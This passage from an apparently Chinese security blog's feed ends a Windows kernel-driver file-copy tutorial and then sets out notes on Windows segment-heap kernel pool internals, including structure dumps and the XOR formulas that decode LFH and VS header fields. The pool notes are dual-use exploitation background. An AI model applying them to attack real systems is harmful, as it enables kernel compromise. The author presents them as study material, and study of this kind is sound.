&amp;SrcFileAttribute, &amp;IoBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SYNCHRONOUS_IO_NONALERT);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Open File %wZ Failed, status: %x\n&quot;</span>, SrcFilePath, status);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4-Get Source File Size &amp; Allocate Transfer Buffer</span></span><br><span class="line">    FILE_STANDARD_INFORMATION StdFileInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    status = <span class="built_in">ZwQueryInformationFile</span>(hSrcFile, &amp;IoBlock, &amp;StdFileInfo, <span class="built_in">sizeof</span>(FILE_STANDARD_INFORMATION), FileStandardInformation);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Query File %wZ Failed, status: %x\n&quot;</span>, SrcFilePath, status);</span><br><span class="line">        <span class="built_in">ZwClose</span>(hSrcFile);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PVOID Transfer = <span class="built_in">ExAllocatePool2</span>(POOL_FLAG_NON_PAGED, StdFileInfo.EndOfFile.QuadPart, <span class="string">&#x27;ymym&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (Transfer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;ExAllocatePool Transfer Buffer Failed, status: %x\n&quot;</span>, status);</span><br><span class="line">        <span class="built_in">ZwClose</span>(hSrcFile);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(Transfer, StdFileInfo.EndOfFile.QuadPart);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5-Read Source File To Buffer</span></span><br><span class="line">    LARGE_INTEGER TempReadCount = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    status = <span class="built_in">ZwReadFile</span>(hSrcFile, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;IoBlock, Transfer, (ULONG)StdFileInfo.EndOfFile.QuadPart, &amp;TempReadCount, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Read to Transfer Buffer Failed, status: %x\n&quot;</span>, status);</span><br><span class="line">        <span class="built_in">ExFreePool</span>(Transfer);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ZwClose</span>(hSrcFile);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6-Create New File</span></span><br><span class="line">    status = <span class="built_in">ZwCreateFile</span>(&amp;hDstFile, GENERIC_ALL, &amp;DstFileAttribute, &amp;IoBlock, <span class="literal">NULL</span>, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create File Failed, status: %x\n&quot;</span>, status);</span><br><span class="line">        <span class="built_in">ExFreePool</span>(Transfer);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7-Write to New File</span></span><br><span class="line">    status = <span class="built_in">ZwWriteFile</span>(hDstFile, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;IoBlock, Transfer, (ULONG)StdFileInfo.EndOfFile.QuadPart, &amp;TempReadCount, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Write File Failed, status: %x\n&quot;</span>, status);</span><br><span class="line">        <span class="built_in">ExFreePool</span>(Transfer);</span><br><span class="line">        <span class="built_in">ZwClose</span>(hDstFile);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ZwClose</span>(hDstFile);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Created New File %wZ\n&quot;</span>, DstFilePath);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">KCopyFile</span><span class="params">(HANDLE hDevice, <span class="type">const</span> <span class="type">wchar_t</span> srcpath[], <span class="type">const</span> <span class="type">wchar_t</span> dstpath[])</span> </span>&#123;</span><br><span class="line">    ParamKernelCopyFile param = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    DWORD info = <span class="number">0</span>;</span><br><span class="line">    std::wstring prefix = <span class="string">L&quot;\\??\\&quot;</span>;</span><br><span class="line">    std::wstring SRC = srcpath;</span><br><span class="line">    std::wstring DST = dstpath;</span><br><span class="line">    SRC = prefix + SRC;</span><br><span class="line">    DST = prefix + DST;</span><br><span class="line"></span><br><span class="line">    param.dstFile = (PWCHAR)DST.<span class="built_in">c_str</span>();</span><br><span class="line">    param.srcFile = (PWCHAR)SRC.<span class="built_in">c_str</span>();</span><br><span class="line">    param.dstFileLen = DST.<span class="built_in">size</span>() * <span class="number">2</span> - <span class="number">1</span>;</span><br><span class="line">    param.srcFileLen = SRC.<span class="built_in">size</span>() * <span class="number">2</span> - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    std::wcout &lt;&lt; <span class="string">L&quot;SRC Path &quot;</span> &lt;&lt; param.srcFile &lt;&lt; std::endl;</span><br><span class="line">    std::wcout &lt;&lt; <span class="string">L&quot;DST Path &quot;</span> &lt;&lt; param.dstFile &lt;&lt; std::endl;</span><br><span class="line">    <span class="built_in">DeviceIoControl</span>(hDevice, IOCTL_COPY_FILE, (LPVOID)&amp;param, <span class="built_in">sizeof</span>(param), <span class="literal">NULL</span>, <span class="number">0</span>, &amp;info, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="更好的文件复制"><a class="markdownIt-Anchor" href="#更好的文件复制"></a> 更好的文件复制</h2><p>复制的时候使用内存大小，但是内核内存还是得节省着用，而且大文件可能会整数溢出</p><p>写个write的循环就行了</p><p>但是想了想涉及到文件追加啥的，我是懒狗</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;之前写过：&lt;a href=&quot;https://joe1sn.eu.org/2023/02/16/windows_kernel_driver_1/&quot;&gt;windows内核驱动 1-环境搭建&lt;/a&gt;、&lt;a href=&quot;https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/&quot;&gt;windows内核驱动 2-页表探索&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;但是内容确实有点衔接不上，这里根据&lt;a href=&quot;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/&quot;&gt;【Win Pwn】HEVD-内核栈溢出(上)&lt;/a&gt;中展示的基础技巧来继续&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】Windows内核池笔记</title>
    <link href="https://joe1sn.eu.org/2024/03/17/win-kernel-pool/"/>
    <id>https://joe1sn.eu.org/2024/03/17/win-kernel-pool/</id>
    <published>2024-03-17T01:43:37.000Z</published>
    <updated>2024-03-17T03:34:19.991Z</updated>
    
    <content type="html"><![CDATA[<p>文章来自blackhat 2021的文章《Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded》</p><p>原文链接：<a href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded.pdf">https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded.pdf</a></p><p>Youtube：<a href="https://www.youtube.com/watch?v=VvxNc8GTFfk">https://www.youtube.com/watch?v=VvxNc8GTFfk</a></p><span id="more"></span><h1 id="粗略的分配"><a class="markdownIt-Anchor" href="#粗略的分配"></a> 粗略的分配</h1><p>内核动态内存：和R3中的对差不多</p><p>类型为可分页和不可分页，程序按照4KB分页，之前写过一点相关的：<a href="https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/">Joe1sn’s Cabinet | windows内核驱动 2-页表探索</a></p><p>旧API初始化中不会将内存置零，导致信息泄露</p><p>一些API</p><p><img src="https://img.joe1sn.top/uploads/big/f1d91b71f507bed8db8d8849de7e6bff.png" alt="image-20240317095459904" /></p><p>在RS5（Redstone 5）版本前（及Windows 1809，在2018年10月前的版本）</p><p><img src="https://img.joe1sn.top/uploads/big/f364e47d4cdcab7796144a5b39a53f85.png" alt="image-20240317095835831" /></p><p>没有任何校验、加密等等，但是之后就变得复杂得多了（严重怀疑微软借鉴了glibc的内存管理）</p><p><img src="https://img.joe1sn.top/uploads/big/170fbb2877774bded875232a3a8c3128.png" alt="image-20240317100321871" /></p><ul><li>新版本的池设计管理和R3下是同一个库</li><li><strong>每一个独立的池由<code>SEGMENT_HEAP</code>结构体管理</strong>，后文简写为<code>SEG_HEAP</code></li><li>池的申请根据其大小进行不同的处理<ul><li>不同大小申请机制不同</li><li>大内存池仍然由<code>VA</code>管理</li></ul></li></ul><p><strong>SEGMENT_HEAP</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt nt!_SEGMENT_HEAP</span><br><span class="line">   +<span class="number">0x000</span> EnvHandle        : RTL_HP_ENV_HANDLE</span><br><span class="line">   +<span class="number">0x010</span> Signature        : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> GlobalFlags      : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> Interceptor      : Uint4B</span><br><span class="line">   +<span class="number">0x01c</span> ProcessHeapListIndex : Uint2B</span><br><span class="line">   +<span class="number">0x01e</span> AllocatedFromMetadata : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x020</span> CommitLimitData  : _RTL_HEAP_MEMORY_LIMIT_DATA</span><br><span class="line">   +<span class="number">0x020</span> ReservedMustBeZero1 : Uint8B</span><br><span class="line">   +<span class="number">0x028</span> UserContext      : Ptr64 Void</span><br><span class="line">   +<span class="number">0x030</span> ReservedMustBeZero2 : Uint8B</span><br><span class="line">   +<span class="number">0x038</span> Spare            : Ptr64 Void</span><br><span class="line">   +<span class="number">0x040</span> LargeMetadataLock : Uint8B</span><br><span class="line">   +<span class="number">0x048</span> LargeAllocMetadata : _RTL_RB_TREE</span><br><span class="line">   +<span class="number">0x058</span> LargeReservedPages : Uint8B</span><br><span class="line">   +<span class="number">0x060</span> LargeCommittedPages : Uint8B</span><br><span class="line">   +<span class="number">0x068</span> StackTraceInitVar : _RTL_RUN_ONCE</span><br><span class="line">   +<span class="number">0x080</span> MemStats         : _HEAP_RUNTIME_MEMORY_STATS</span><br><span class="line">   +<span class="number">0x0d8</span> GlobalLockCount  : Uint2B</span><br><span class="line">   +<span class="number">0x0dc</span> GlobalLockOwner  : Uint4B</span><br><span class="line">   +<span class="number">0x0e0</span> ContextExtendLock : Uint8B</span><br><span class="line">   +<span class="number">0x0e8</span> AllocatedBase    : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x0f0</span> UncommittedBase  : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x0f8</span> ReservedLimit    : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x100</span> SegContexts      : [<span class="number">2</span>] _HEAP_SEG_CONTEXT</span><br><span class="line">   +<span class="number">0x280</span> VsContext        : _HEAP_VS_CONTEXT</span><br><span class="line">   +<span class="number">0x340</span> LfhContext       : _HEAP_LFH_CONTEXT</span><br></pre></td></tr></table></figure><p>文章选了一些重点来</p><p><img src="https://img.joe1sn.top/uploads/big/ed29af21efa3768777ad12bffd6c222e.png" alt="image-20240317101151659" /></p><p>根据上图缩略结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt nt!_SEGMENT_HEAP</span><br><span class="line">  ....</span><br><span class="line">   +<span class="number">0x048</span> LargeAllocMetadata : _RTL_RB_TREE</span><br><span class="line">  ....</span><br><span class="line">   +<span class="number">0x080</span> MemStats         : _HEAP_RUNTIME_MEMORY_STATS<span class="comment">//大内存页状态</span></span><br><span class="line">  ....</span><br><span class="line">   +<span class="number">0x0e8</span> AllocatedBase    : Ptr64 UChar<span class="comment">//已分配内存</span></span><br><span class="line">   +<span class="number">0x0f0</span> UncommittedBase  : Ptr64 UChar<span class="comment">//未提交内存</span></span><br><span class="line">   +<span class="number">0x0f8</span> ReservedLimit    : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x100</span> SegContexts      : [<span class="number">2</span>] _HEAP_SEG_CONTEXT</span><br><span class="line">   +<span class="number">0x280</span> VsContext        : _HEAP_VS_CONTEXT<span class="comment">//VS类型堆管理链表</span></span><br><span class="line">   +<span class="number">0x340</span> LfhContext       : _HEAP_LFH_CONTEXT<span class="comment">//KLFH类型堆管理链表</span></span><br></pre></td></tr></table></figure><p>根据文章，<code>SEG_HEAP</code>通过两个<code>SegContexts</code>来处理前两种大小的内存（小堆和中堆）</p><ul><li>0~508KB（0-0x7F000）</li><li>508KB~8128KB（0x7F000-0x7F0000）</li><li>大于8128KB（大堆处理）</li></ul><p>内核通过位图（bitmap，做过算法的应该知道吧）保存每次申请的大小的类型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nt!ExPoolState‐&gt;HeapManager‐&gt;AllocTracker‐&gt;AllocTrackerBitma</span><br></pre></td></tr></table></figure><p>关于位图</p><p><img src="https://img.joe1sn.top/uploads/big/d5acbdc61a3cace2b43c3a2f3b0e104e.png" alt="image-20240317102907777" /></p><ul><li>每两字节（2Byte）表示在内核内存中的地址</li><li>位图存在三层</li></ul><p><code>_HEAP_SEG_CONTEXT</code>结构体：</p><p>在<code>SEG_HEAP</code>中</p><ul><li><code>_HEAP_SEG_CONTEXT[0]</code>：以 1 页的基本单位处理 1MB 段</li><li><code>_HEAP_SEG_CONTEXT[1]</code>：以 16 页的基本单位处理 16MB 段</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dt nt!_HEAP_SEG_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> SegmentMask      : Uint8B</span><br><span class="line">   +<span class="number">0x008</span> UnitShift        : UChar</span><br><span class="line">   +<span class="number">0x009</span> PagesPerUnitShift : UChar</span><br><span class="line">   +<span class="number">0x00a</span> FirstDescriptorIndex : UChar</span><br><span class="line">   +<span class="number">0x00b</span> CachedCommitSoftShift : UChar</span><br><span class="line">   +<span class="number">0x00c</span> CachedCommitHighShift : UChar</span><br><span class="line">   +<span class="number">0x00d</span> Flags            : &lt;anonymous-tag&gt;</span><br><span class="line">   +<span class="number">0x010</span> MaxAllocationSize : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> OlpStatsOffset   : Int2B</span><br><span class="line">   +<span class="number">0x016</span> MemStatsOffset   : Int2B</span><br><span class="line">   +<span class="number">0x018</span> LfhContext       : Ptr64 Void</span><br><span class="line">   +<span class="number">0x020</span> VsContext        : Ptr64 Void</span><br><span class="line">   +<span class="number">0x028</span> EnvHandle        : RTL_HP_ENV_HANDLE</span><br><span class="line">   +<span class="number">0x038</span> Heap             : Ptr64 Void</span><br><span class="line">   +<span class="number">0x040</span> SegmentLock      : Uint8B</span><br><span class="line">   +<span class="number">0x048</span> SegmentListHead  : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x058</span> SegmentCount     : Uint8B</span><br><span class="line">   +<span class="number">0x060</span> FreePageRanges   : _RTL_RB_TREE</span><br><span class="line">   +<span class="number">0x070</span> FreeSegmentListLock : Uint8B</span><br><span class="line">   +<span class="number">0x078</span> FreeSegmentList  : [<span class="number">2</span>] _SINGLE_LIST_ENTRY</span><br></pre></td></tr></table></figure><p>简化一下重要信息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dt nt!_HEAP_SEG_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> SegmentMask      : Uint8B<span class="comment">//如何从池内存到当前段</span></span><br><span class="line">.....</span><br><span class="line">   +<span class="number">0x048</span> SegmentListHead  : _LIST_ENTRY<span class="comment">//连接所有已分配的堆</span></span><br><span class="line">.....</span><br><span class="line">   +<span class="number">0x078</span> FreeSegmentList  : [<span class="number">2</span>] _SINGLE_LIST_ENTRY<span class="comment">//链接所有已释放的堆</span></span><br></pre></td></tr></table></figure><p>段(segment)链接的结构体为`HEAP_PAGE_SEGMENT</p><p><code>_HEAP_PAGE_SEGMENT</code>结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_PAGE_SEGMENT</span><br><span class="line">   +<span class="number">0x000</span> ListEntry        : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x010</span> Signature        : Uint8B</span><br><span class="line">   +<span class="number">0x018</span> SegmentCommitState : Ptr64 _HEAP_SEGMENT_MGR_COMMIT_STATE</span><br><span class="line">   +<span class="number">0x020</span> UnusedWatermark  : UChar</span><br><span class="line">   +<span class="number">0x000</span> DescArray        : [<span class="number">256</span>] _HEAP_PAGE_RANGE_DESCRIPTOR</span><br></pre></td></tr></table></figure><p>这里抹除类型，给点注释</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_PAGE_SEGMENT</span><br><span class="line">   +<span class="number">0x000</span> ListEntry        :       <span class="comment">//结构体`SEG_CONTECT`指向，可参考下面的图</span></span><br><span class="line">   +<span class="number">0x010</span> Signature        :       <span class="comment">//可以找到`SEG_CONTEXT`，但是被异或加密了</span></span><br><span class="line"><span class="comment">//解密方法 `段地址 ^ 堆密钥(heap key) ^ 魔数`</span></span><br><span class="line">........</span><br><span class="line">   +<span class="number">0x000</span> DescArray        : [<span class="number">256</span>] <span class="comment">//每个保存一个单元，还有子段(subseg)类型和偏移</span></span><br><span class="line">   <span class="comment">//  +0x000 TreeNode         : _RTL_BALANCED_NODE</span></span><br><span class="line">   <span class="comment">//  +0x000 TreeSignature    : Uint4B</span></span><br><span class="line">   <span class="comment">//  +0x004 UnusedBytes      : Uint4B</span></span><br><span class="line">   <span class="comment">//  +0x008 ExtraPresent     : Pos 0, 1 Bit</span></span><br><span class="line">   <span class="comment">//  +0x008 Spare0           : Pos 1, 15 Bits</span></span><br><span class="line">   <span class="comment">//  +0x018 RangeFlags       : UChar</span></span><br><span class="line">   <span class="comment">//  +0x019 CommittedPageCount : UChar</span></span><br><span class="line">   <span class="comment">//  +0x01a Spare            : Uint2B</span></span><br><span class="line">   <span class="comment">//  +0x01c Key              : _HEAP_DESCRIPTOR_KEY</span></span><br><span class="line">   <span class="comment">//  +0x01c Align            : [3] UChar</span></span><br><span class="line">   <span class="comment">//  +0x01f UnitOffset       : UChar</span></span><br><span class="line">   <span class="comment">//  +0x01f UnitSize         : UChar</span></span><br></pre></td></tr></table></figure><p>总结下当前的内核相关信息，从<code>SEG_HEAP</code>开始</p><p><img src="https://img.joe1sn.top/uploads/big/271ff260bccb87ea153b8e49dc8db2bd.png" alt="image-20240317103818286" /></p><h1 id="关于两种大小的内存管理"><a class="markdownIt-Anchor" href="#关于两种大小的内存管理"></a> 关于两种大小的内存管理</h1><h2 id="两种子段-vs和lfh"><a class="markdownIt-Anchor" href="#两种子段-vs和lfh"></a> 两种子段 VS和LFH</h2><p><strong>1. LFH - Low Fragmentation Heap</strong></p><p><code>_HEAP_LFH_SUBSEGMENT</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_LFH_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x000</span> ListEntry        : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x010</span> Owner            : Ptr64 _HEAP_LFH_SUBSEGMENT_OWNER</span><br><span class="line">   +<span class="number">0x010</span> DelayFree        : _HEAP_LFH_SUBSEGMENT_DELAY_FREE</span><br><span class="line">   +<span class="number">0x018</span> CommitLock       : Uint8B</span><br><span class="line">   +<span class="number">0x020</span> FreeCount        : Uint2B</span><br><span class="line">   +<span class="number">0x022</span> BlockCount       : Uint2B</span><br><span class="line">   +<span class="number">0x020</span> InterlockedShort : Int2B</span><br><span class="line">   +<span class="number">0x020</span> InterlockedLong  : Int4B</span><br><span class="line">   +<span class="number">0x024</span> FreeHint         : Uint2B</span><br><span class="line">   +<span class="number">0x026</span> Location         : UChar</span><br><span class="line">   +<span class="number">0x027</span> WitheldBlockCount : UChar</span><br><span class="line">   +<span class="number">0x028</span> BlockOffsets     : _HEAP_LFH_SUBSEGMENT_ENCODED_OFFSETS</span><br><span class="line">   +<span class="number">0x02c</span> CommitUnitShift  : UChar</span><br><span class="line">   +<span class="number">0x02d</span> CommitUnitCount  : UChar</span><br><span class="line">   +<span class="number">0x02e</span> CommitStateOffset : Uint2B</span><br><span class="line">   +<span class="number">0x030</span> BlockBitmap      : [<span class="number">1</span>] Uint8B</span><br></pre></td></tr></table></figure><ul><li><p>用于 129 种常见大小的分配</p><p><img src="https://img.joe1sn.top/uploads/big/e6e613b9c73ef4cfdf6469218064d5db.png" alt="image-20240317112023052" /></p></li><li><p>所有分配的子段有一样的大小</p></li><li><p>最大大小是<code>0x4000</code></p></li><li><p>为了节省空间，没有独特的head</p></li><li><p>堆块的状态由head中的位图决定</p></li></ul><p><strong>2. VS - Variable Size</strong></p><p><code>_HEAP_VS_SUBSEGMENT</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_VS_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x000</span> ListEntry        : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x010</span> CommitBitmap     : Uint8B</span><br><span class="line">   +<span class="number">0x018</span> CommitLock       : Uint8B</span><br><span class="line">   +<span class="number">0x020</span> Size             : Uint2B</span><br><span class="line">   +<span class="number">0x022</span> Signature        : Pos <span class="number">0</span>, <span class="number">15</span> Bits</span><br><span class="line">   +<span class="number">0x022</span> FullCommit       : Pos <span class="number">15</span>, <span class="number">1</span> Bit</span><br></pre></td></tr></table></figure><ul><li>处理所有LFH不能处理的bucket</li><li>没有个块(block)都有一个自己的头描述</li></ul><p>两者的对比</p><p><img src="https://img.joe1sn.top/uploads/big/47b7aed371bc8f6e9464a64b014f0ec9.png" alt="image-20240317110710922" /></p><ul><li>VS头中的大小使用<code>heap key</code>加密（其实是编码，这里为了语义通顺），LFH使用自己的<code>LFH Key</code> 加密。（这显然让堆利用变得困难，你猜为啥我要反过来读这篇文章而不是直接做HEVD）</li><li>子段大小不固定</li><li>子段包含多个页，必须从头开始计算偏移去寻找（单独寻找某个页已经几乎不可能）</li><li>已分配的块仍然会存在<code>POOL_HEAD</code>，但是释放掉的不会</li></ul><p><strong>相关的“加密&quot;</strong></p><ul><li>HEAP_LFH_SUBSEGMENT<ol><li>块大小和偏移量位于编码的 BlockOffsets 字段中</li><li>数据（Data） = <code> EncodedData ^ LfhKey ^ ((ULONG)(Subsegment) &gt;&gt; 12)</code></li><li>子段列表没被加密</li></ol></li><li>HEAP_VS_SUBSEGMENT<ol><li>用于链接子段的列表被当前子段地址加密了</li></ol></li><li>HEAP_VS_CHUNK_HEADER<ol><li>每一个VS子段中头存在</li><li>块大小和分配状态在<code>Size</code>头中被加密</li><li>数据（Data）= <code>Sizes.HeaderBits ^ HeapKey ^ ChunkHeader</code></li></ol></li></ul><h2 id="两种上下文"><a class="markdownIt-Anchor" href="#两种上下文"></a> 两种上下文</h2><p>最开始的<code>SEG_HEAP</code>中有</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x280</span> VsContext        : _HEAP_VS_CONTEXT</span><br><span class="line">+<span class="number">0x340</span> LfhContext       : _HEAP_LFH_CONTEXT</span><br></pre></td></tr></table></figure><p><strong>_HEAP_LFH_CONTEXT</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_LFH_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> BackendCtx       : Ptr64 Void</span><br><span class="line">   +<span class="number">0x008</span> Callbacks        : _HEAP_SUBALLOCATOR_CALLBACKS</span><br><span class="line">   +<span class="number">0x030</span> AffinityModArray : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x038</span> MaxAffinity      : UChar</span><br><span class="line">   +<span class="number">0x039</span> LockType         : UChar</span><br><span class="line">   +<span class="number">0x03a</span> MemStatsOffset   : Int2B</span><br><span class="line">   +<span class="number">0x03c</span> Config           : _RTL_HP_LFH_CONFIG</span><br><span class="line">   +<span class="number">0x040</span> BucketStats      : _HEAP_LFH_SUBSEGMENT_STATS</span><br><span class="line">   +<span class="number">0x048</span> SubsegmentCreationLock : Uint8B</span><br><span class="line">   +<span class="number">0x080</span> Buckets          : [<span class="number">129</span>] Ptr64 _HEAP_LFH_BUCKET</span><br></pre></td></tr></table></figure><p>注释关键信息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span 